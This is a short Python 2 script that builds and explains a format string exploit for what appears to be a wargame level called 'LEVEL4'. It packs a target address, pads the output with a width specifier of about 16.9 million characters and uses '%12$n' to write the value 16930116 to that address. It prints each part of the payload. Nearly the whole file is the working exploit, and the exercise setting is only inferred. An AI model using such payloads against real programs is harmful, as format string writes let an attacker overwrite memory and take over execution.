#!/usr/bin/env python2

import struct

# Debug version to understand the exploit
target_addr = 0x8049810
target_value = 16930116

print "=== LEVEL4 FORMAT STRING EXPLOIT DEBUG ==="
print "Target address: 0x%08x" % target_addr
print "Target value: %d (0x%x)" % (target_value, target_value)
print "Stack position: 12"
print ""

# Calculate payload
addr_bytes = struct.pack("<L", target_addr)
remaining = target_value - 4

print "Payload breakdown:"
print "  Address: %s (4 bytes)" % repr(addr_bytes)
print "  Width specifier: %%%dc (%d characters)" % (remaining, remaining)
print "  Format write: %%12$n"
print "  Total characters: %d" % target_value
print ""

payload = addr_bytes + "%" + str(remaining) + "c" + "%12$n"
print "Payload structure:"
print repr(payload)
print ""
print "Note: This will print %d characters (about 16MB of output)" % target_value
print "The output will be mostly spaces due to the width specifier."